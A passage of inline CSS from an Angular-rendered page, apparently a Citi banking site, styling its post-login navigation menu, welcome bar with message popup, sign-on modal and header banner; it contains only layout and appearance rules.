      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #accountsMainLI .subMenuGroupParent .subMenuGroupUL {
        margin-top: 0
      }
    }

    @media screen and (min-width:1120px) and (-ms-high-contrast:none),
    (-ms-high-contrast:active) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #pntMainLI .subMenuGroupParent {
        min-height: 310px
      }
    }

    @media screen and (min-width:1120px) and (max-width:1120px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #rewardsMainLI #rewardssubGroup4 child-nav-group3 .subMenuGroupUL #somElement {
        height: 90vh
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #accountsMainLI .subMenuGroupParent .subMenuGroupUL {
        padding-top: 0 !important
      }
    }

    @media screen and (max-width:1119px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #accountsMainLI .subMenuGroupParent .child-nav-group3 {
        padding-top: 0 !important;
        padding-bottom: 0 !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #accountsMainLI .subMenuGroupParent .child-nav-group3 .subMenuGroupTitle {
        display: none
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #accountsMainLI .subMenuGroupParent .child-nav-group3 .subMenuGroupUL {
        padding-top: 0 !important;
        width: 100% !important
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #accountsMainLI .subMenuGroupParent .child-nav-group3 .subMenuGroupUL .subMenuGroupLI {
        margin-top: 0 !important
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #openAccPostMainLI a {
      position: relative;
      font-family: Interstate_Bold, sans-serif
    }

    @media screen and (min-width:1120px) {
      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #accountsMainLI .subMenuGroupParent .subMenuGroupUL .subMenuGroupLI {
        line-height: 2.5
      }

      .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #openAccPostMainLI a:after {
        content: "";
        background-image: url();
        background-repeat: no-repeat;
        font-size: 18px;
        position: absolute;
        top: 17px;
        right: -9px;
        width: 20px;
        height: 20px
      }
    }

    .postLogin[_ngcontent-ssr-c131] .nav-bar-main-ul[_ngcontent-ssr-c131] #openAccPostMainLI .subMenuMainContainer {
      display: none
    }
  </style>
  <style>
    @media (max-width:768px) {
      [_nghost-ssr-c113] {
        display: none
      }
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] {
      display: flex;
      max-width: 940px;
      margin: 0 auto
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] {
      display: flex;
      justify-content: flex-start;
      padding: 10px 0;
      width: 100%;
      height: 37px;
      border-bottom: 1px solid #eee;
      font-size: 12px;
      font-family: Arial, sans-serif
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113]>*[_ngcontent-ssr-c113] {
      border-right: 2px solid #888;
      margin-right: 10px;
      padding-right: 10px
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113]>[_ngcontent-ssr-c113]:last-child {
      border: none;
      margin-right: 0;
      padding-right: 0
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .welcome[_ngcontent-ssr-c113] {
      font-weight: 700
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .profile-and-settings[_ngcontent-ssr-c113] citi-cta[_ngcontent-ssr-c113] a,
    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .profile-and-settings[_ngcontent-ssr-c113] citi-cta[_ngcontent-ssr-c113] button {
      font-family: Arial, sans-serif;
      font-size: 12px;
      color: #333;
      text-decoration: none;
      margin-right: 0
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] {
      position: relative;
      height: 16px
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113]:after {
      content: " ";
      display: table;
      clear: both
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] citi-cta[_ngcontent-ssr-c113] a {
      font-size: 12px;
      text-decoration: none;
      margin: 0;
      color: #05589d;
      font-family: Arial, sans-serif
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] citi-cta[_ngcontent-ssr-c113] a:hover {
      text-decoration: underline
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113] {
      color: #05589d;
      background: 0 0;
      padding: 0;
      border: none
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113]:hover .message-wording[_ngcontent-ssr-c113] {
      text-decoration: underline
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113] .message-wording[_ngcontent-ssr-c113] {
      height: 15px;
      margin-left: 5px
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113] .message-count[_ngcontent-ssr-c113] {
      width: 20px;
      height: 16px;
      line-height: 15px;
      text-align: center;
      float: left;
      border: 1px solid #888;
      background: linear-gradient(to bottom, #fff 0, #ccc 100%)
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .title-bar.active[_ngcontent-ssr-c113]:focus {
      outline: 0
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] {
      visibility: hidden;
      -webkit-transition: visibility linear;
      -moz-transition: visibility linear;
      -ms-transition: visibility 0s linear;
      -o-transition: visibility linear;
      transition-delay: 1s;
      top: -10px;
      margin-left: -10px;
      position: absolute;
      border-radius: 10px;
      box-shadow: 2px 2px 24px -7px #3d3d3d;
      z-index: 10;
      width: 250px;
      overflow: hidden;
      background: url() center center
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113] {
      position: relative;
      width: 250px;
      padding: 10px;
      border-radius: 10px 10px 0 0;
      background: url() center center
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113]:after {
      content: "";
      width: 13px;
      height: 13px;
      position: absolute;
      top: 12px;
      right: 10px;
      background: url() 0 -672px no-repeat
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113] .message-count[_ngcontent-ssr-c113] {
      float: left
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .title-bar[_ngcontent-ssr-c113] .message-wording[_ngcontent-ssr-c113] {
      float: left
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] {
      max-height: 0;
      transition: max-height .5s ease-in-out .5s
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] {
      opacity: 0;
      transition: opacity .5s ease-in-out
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] citi-text-header[_ngcontent-ssr-c113] {
      font-weight: 700;
      font-family: Interstate_Light, sans-serif
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] citi-text-header[_ngcontent-ssr-c113]>* {
      margin: 0;
      padding: 10px 20px 0 13px
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] p[_ngcontent-ssr-c113] {
      padding: 0 13px;
      font-size: 12px
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] ul[_ngcontent-ssr-c113] {
      margin: 10px 0 15px;
      padding: 0 20px 0 24px
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] ul[_ngcontent-ssr-c113] li[_ngcontent-ssr-c113] {
      list-style-type: none;
      font-family: Arial, sans-serif;
      margin: 0 0 5px;
      position: relative
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] ul[_ngcontent-ssr-c113] li[_ngcontent-ssr-c113]:last-child {
      margin-bottom: 0
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] ul[_ngcontent-ssr-c113] li[_ngcontent-ssr-c113]:before {
      content: "";
      position: absolute;
      left: -10px;
      top: 3px;
      width: 0;
      height: 0;
      border-style: solid;
      border-width: 6px 0 6px 6px;
      border-color: transparent transparent transparent #858585
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] ul[_ngcontent-ssr-c113] li[_ngcontent-ssr-c113] citi-cta[_ngcontent-ssr-c113] a {
      font-size: 12px;
      font-family: Arial, sans-serif;
      width: 100%;
      display: block;
      overflow: hidden;
      white-space: nowrap;
      text-overflow: ellipsis;
      margin-right: 0
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] .controls[_ngcontent-ssr-c113] {
      padding: 0 20px 10px 13px;
      display: flex;
      justify-content: space-between
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] .controls[_ngcontent-ssr-c113] citi-cta[_ngcontent-ssr-c113] a {
      font-family: Arial, sans-serif;
      font-size: 12px;
      margin: 0
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages.open[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] {
      visibility: visible;
      transition-delay: 0s
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages.open[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] {
      max-height: 200px;
      transition: max-height .5s ease-in-out
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .content[_ngcontent-ssr-c113] .messages.open[_ngcontent-ssr-c113] .popup[_ngcontent-ssr-c113] .popup-content[_ngcontent-ssr-c113] .popup-items[_ngcontent-ssr-c113] {
      opacity: 1;
      transition: opacity .5s ease-in-out .5s
    }

    [_nghost-ssr-c113]>.welcome[_ngcontent-ssr-c113] .logo[_ngcontent-ssr-c113] {
      margin-left: 15px;
      margin-top: 10px
    }
  </style>
  <style>
    a[_ngcontent-ssr-c134],
    abbr[_ngcontent-ssr-c134],
    acronym[_ngcontent-ssr-c134],
    address[_ngcontent-ssr-c134],
    applet[_ngcontent-ssr-c134],
    article[_ngcontent-ssr-c134],
    aside[_ngcontent-ssr-c134],
    audio[_ngcontent-ssr-c134],
    b[_ngcontent-ssr-c134],
    big[_ngcontent-ssr-c134],
    blockquote[_ngcontent-ssr-c134],
    body[_ngcontent-ssr-c134],
    canvas[_ngcontent-ssr-c134],
    caption[_ngcontent-ssr-c134],
    center[_ngcontent-ssr-c134],
    cite[_ngcontent-ssr-c134],
    code[_ngcontent-ssr-c134],
    dd[_ngcontent-ssr-c134],
    del[_ngcontent-ssr-c134],
    details[_ngcontent-ssr-c134],
    dfn[_ngcontent-ssr-c134],
    div[_ngcontent-ssr-c134],
    dl[_ngcontent-ssr-c134],
    dt[_ngcontent-ssr-c134],
    em[_ngcontent-ssr-c134],
    embed[_ngcontent-ssr-c134],
    fieldset[_ngcontent-ssr-c134],
    figcaption[_ngcontent-ssr-c134],
    figure[_ngcontent-ssr-c134],
    footer[_ngcontent-ssr-c134],
    form[_ngcontent-ssr-c134],
    h1[_ngcontent-ssr-c134],
    h2[_ngcontent-ssr-c134],
    h3[_ngcontent-ssr-c134],
    h4[_ngcontent-ssr-c134],
    h5[_ngcontent-ssr-c134],
    h6[_ngcontent-ssr-c134],
    header[_ngcontent-ssr-c134],
    hgroup[_ngcontent-ssr-c134],
    html[_ngcontent-ssr-c134],
    i[_ngcontent-ssr-c134],
    iframe[_ngcontent-ssr-c134],
    img[_ngcontent-ssr-c134],
    ins[_ngcontent-ssr-c134],
    kbd[_ngcontent-ssr-c134],
    label[_ngcontent-ssr-c134],
    legend[_ngcontent-ssr-c134],
    li[_ngcontent-ssr-c134],
    mark[_ngcontent-ssr-c134],
    menu[_ngcontent-ssr-c134],
    nav[_ngcontent-ssr-c134],
    object[_ngcontent-ssr-c134],
    ol[_ngcontent-ssr-c134],
    output[_ngcontent-ssr-c134],
    p[_ngcontent-ssr-c134],
    pre[_ngcontent-ssr-c134],
    q[_ngcontent-ssr-c134],
    ruby[_ngcontent-ssr-c134],
    s[_ngcontent-ssr-c134],
    samp[_ngcontent-ssr-c134],
    section[_ngcontent-ssr-c134],
    small[_ngcontent-ssr-c134],
    span[_ngcontent-ssr-c134],
    strike[_ngcontent-ssr-c134],
    strong[_ngcontent-ssr-c134],
    sub[_ngcontent-ssr-c134],
    summary[_ngcontent-ssr-c134],
    sup[_ngcontent-ssr-c134],
    table[_ngcontent-ssr-c134],
    tbody[_ngcontent-ssr-c134],
    td[_ngcontent-ssr-c134],
    tfoot[_ngcontent-ssr-c134],
    th[_ngcontent-ssr-c134],
    thead[_ngcontent-ssr-c134],
    time[_ngcontent-ssr-c134],
    tr[_ngcontent-ssr-c134],
    tt[_ngcontent-ssr-c134],
    u[_ngcontent-ssr-c134],
    ul[_ngcontent-ssr-c134],
    var[_ngcontent-ssr-c134],
    video[_ngcontent-ssr-c134] {
      margin: 0;
      padding: 0;
      border: 0;
      font: inherit;
      vertical-align: baseline
    }

    article[_ngcontent-ssr-c134],
    aside[_ngcontent-ssr-c134],
    details[_ngcontent-ssr-c134],
    figcaption[_ngcontent-ssr-c134],
    figure[_ngcontent-ssr-c134],
    footer[_ngcontent-ssr-c134],
    header[_ngcontent-ssr-c134],
    hgroup[_ngcontent-ssr-c134],
    menu[_ngcontent-ssr-c134],
    nav[_ngcontent-ssr-c134],
    section[_ngcontent-ssr-c134] {
      display: block
    }

    body[_ngcontent-ssr-c134] {
      line-height: 1
    }

    ol[_ngcontent-ssr-c134],
    ul[_ngcontent-ssr-c134] {
      list-style: none
    }

    blockquote[_ngcontent-ssr-c134],
    q[_ngcontent-ssr-c134] {
      quotes: none
    }

    blockquote[_ngcontent-ssr-c134]:after,
    blockquote[_ngcontent-ssr-c134]:before,
    q[_ngcontent-ssr-c134]:after,
    q[_ngcontent-ssr-c134]:before {
      content: "";
      content: none
    }

    table[_ngcontent-ssr-c134] {
      border-collapse: collapse;
      border-spacing: 0
    }

    [_nghost-ssr-c134] citi-modal .modal .modal-dialog .modal-content {
      text-align: left;
      border: none;
      border-radius: 0;
      background-color: #fff;
      box-shadow: none;
      width: 344px;
      height: auto
    }

    [_nghost-ssr-c134] citi-modal .citi-modal {
      margin-top: 50px
    }

    [_nghost-ssr-c134] .citi-modal .modal-dialog {
      width: 344px !important;
      margin: 40px auto !important
    }

    [_nghost-ssr-c134] citi-text-header .header-level-2 {
      font-size: 26px
    }

    [_nghost-ssr-c134] .citi-modal .modal-header citi-icon2 div {
      right: 8px;
      top: 10px;
      position: absolute
    }

    [_nghost-ssr-c134] citi-modal .modal-body {
      padding-right: 20px !important;
      padding-left: 20px !important
    }

    [_nghost-ssr-c134] citi-modal .modal-body div {
      position: relative
    }

    [_nghost-ssr-c134] citi-modal .modal-body:last-child {
      margin-bottom: 0
    }

    [_nghost-ssr-c134] citi-modal citi-form-container .row .linkBlock {
      margin: 10px 0
    }

    [_nghost-ssr-c134] .signonButton citi-cta button {
      width: 100% !important
    }

    .linkBlock[_ngcontent-ssr-c134] a[_ngcontent-ssr-c134] {
      font-size: 12px !important;
      white-space: normal !important;
      text-align: left !important;
      vertical-align: top !important;
      margin: 0 !important;
      width: auto !important
    }

    [_nghost-ssr-c134] citi-modal .modal .modal-footer {
      padding-top: 0;
      padding-bottom: 0
    }

    .form-group[_ngcontent-ssr-c134] {
      margin-bottom: 0 !important
    }

    .password-input[_ngcontent-ssr-c134] {
      padding-top: 10px
    }

    @media only screen and (max-width:600px) {
      [_nghost-ssr-c134] .citi-modal .modal-dialog {
        width: 100% !important
      }

      [_nghost-ssr-c134] citi-modal .modal .modal-dialog .modal-content {
        text-align: left;
        border: none;
        border-radius: 0;
        background-color: #fff;
        box-shadow: none;
        width: 100%;
        height: auto;
        margin: 0 auto
      }

      [_nghost-ssr-c134] citi-modal .citi-modal {
        margin-top: 0
      }
    }

    citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] {
      background: #fff;
      max-width: 665px;
      max-width: 450px !important
    }

    citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] .form-group[_ngcontent-ssr-c134] {
      width: 100%;
      margin: 0
    }

    @media (max-width:480px) {
      citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] {
        min-height: 100%
      }

      citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] .citi-modal-content[_ngcontent-ssr-c134] {
        max-height: 100%
      }
    }

    citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] .citi-modal-content[_ngcontent-ssr-c134] citi-cta[_ngcontent-ssr-c134],
    citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] .citi-modal-content[_ngcontent-ssr-c134] citi-cta[_ngcontent-ssr-c134] button[_ngcontent-ssr-c134] {
      width: 100%
    }

    citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] citi-text-header[_ngcontent-ssr-c134]>*[_ngcontent-ssr-c134] {
      margin-bottom: 15px
    }

    citi-modal[_ngcontent-ssr-c134] .citi-modal-box[_ngcontent-ssr-c134] .citi-modal-content[_ngcontent-ssr-c134] {
      padding-bottom: 20px;
      max-height: initial
    }

    citi-modal[_ngcontent-ssr-c134] .remember-username[_ngcontent-ssr-c134] {
      clear: both;
      position: relative;
      bottom: 3px
    }

    citi-modal[_ngcontent-ssr-c134] .remember-username[_ngcontent-ssr-c134] citi-input-group[_ngcontent-ssr-c134] fieldset[_ngcontent-ssr-c134] {
      margin: 0 0 -20px !important
    }

    citi-modal[_ngcontent-ssr-c134] .remember-username[_ngcontent-ssr-c134] citi-input-group[_ngcontent-ssr-c134] legend[_ngcontent-ssr-c134] {
      margin: 0 !important
    }

    citi-modal[_ngcontent-ssr-c134] .remember-username[_ngcontent-ssr-c134] citi-input-group[_ngcontent-ssr-c134] .checkbox[_ngcontent-ssr-c134] {
      margin: 20px 0
    }

    citi-modal[_ngcontent-ssr-c134] .remember-username[_ngcontent-ssr-c134] p[_ngcontent-ssr-c134] {
      font-size: 12px;
      margin-top: 20px
    }
  </style>
  <style>
    .content-wrap[_ngcontent-ssr-c135] .logo[_ngcontent-ssr-c135] {
      display: inline-flex;
      flex-direction: row;
      flex-wrap: nowrap;
      justify-content: flex-start;
      align-content: center;
      align-items: center;
      height: 100%;
      line-height: 100%
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .logo[_ngcontent-ssr-c135] a[_ngcontent-ssr-c135] {
      display: inline-block;
      height: 40px;
      position: relative;
      top: -2px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .logo[_ngcontent-ssr-c135] a[_ngcontent-ssr-c135] img[_ngcontent-ssr-c135] {
      height: 100%;
      vertical-align: middle
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] {
      display: flex;
      float: right;
      height: 100%
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135] {
      height: 100%;
      margin-right: 40px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135] .contact-us-section[_ngcontent-ssr-c135]:nth-of-type(4) {
      border-top: 2px solid #999;
      padding: 10px 0 0;
      margin-top: 20px;
      margin-bottom: 40px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135] .contact-us-content[_ngcontent-ssr-c135] h3[_ngcontent-ssr-c135] {
      font-size: 1.625rem;
      line-height: 2rem;
      font-family: Interstate_Light, sans-serif;
      font-weight: 400;
      color: #333;
      text-transform: none;
      letter-spacing: normal;
      margin-bottom: 12px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135] strong[_ngcontent-ssr-c135] {
      font-weight: 700
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135] p[_ngcontent-ssr-c135] {
      margin: 12px 0 15px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135] .separator-line[_ngcontent-ssr-c135] {
      border-top: 2px solid #999;
      margin-bottom: 20px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135] .underline[_ngcontent-ssr-c135] {
      text-decoration: underline
    }

    @media (min-width:1200px) {
      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-modal[_ngcontent-ssr-c135] .citi-modal-box {
        width: 30%
      }
    }

    @media (min-width:1440px) {
      .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-modal[_ngcontent-ssr-c135] .citi-modal-box {
        width: 30%
      }
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-cta.en_spaceBtwPhone[_ngcontent-ssr-c135] button {
      margin-right: 80px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-cta.es_spaceBtwPhone[_ngcontent-ssr-c135] button {
      margin-right: -20px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-cta[_ngcontent-ssr-c135] button {
      display: inline-block;
      line-height: 1;
      border: none;
      background: url() center center/18px 18px no-repeat;
      height: 100%;
      width: 65px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-cta[_ngcontent-ssr-c135] button.open,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .contactUs[_ngcontent-ssr-c135]>citi-cta[_ngcontent-ssr-c135] button:hover {
      background-color: rgba(0, 0, 0, .25)
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] {
      height: 100%
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] {
      height: 100%;
      width: 70px
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135] .searchText[_ngcontent-ssr-c135] {
      margin-right: 43px;
      position: absolute;
      top: 24px;
      right: 10px;
      font-family: Interstate_Bold, sans-serif;
      color: #fff;
      font-size: 16px;
      pointer-events: none;
      font-weight: 700
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>*[_ngcontent-ssr-c135] {
      float: right
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showEnglishBg[_ngcontent-ssr-c135] button {
      background: url(assets/img/search.svg) left no-repeat;
      background-color: transparent !important;
      font-family: Interstate-Regular, sans-serif;
      text-decoration: none;
      color: #fff
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showEnglishBg[_ngcontent-ssr-c135] button.open,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showEnglishBg[_ngcontent-ssr-c135] button:focus,
    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showEnglishBg[_ngcontent-ssr-c135] button:hover {
      background: url(assets/img/search.svg) left no-repeat;
      background-color: transparent !important;
      font-family: Interstate-Regular, sans-serif;
      text-decoration: none;
      color: #fff
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showEnglishBg[_ngcontent-ssr-c135] button.activeSearch {
      background: url(assets/img/search.svg) left no-repeat;
      background-color: transparent !important;
      font-family: Interstate-Regular, sans-serif;
      text-decoration: none;
      color: #fff
    }

    .banner[_ngcontent-ssr-c135] .content-wrap[_ngcontent-ssr-c135] .buttons[_ngcontent-ssr-c135] .search[_ngcontent-ssr-c135] form[_ngcontent-ssr-c135]>citi-cta.showSpanishBg[_ngcontent-ssr-c135] button {
      background: url() center right/20px 20px no-repeat;
      background-position-x: 69px;
      height: 100%;
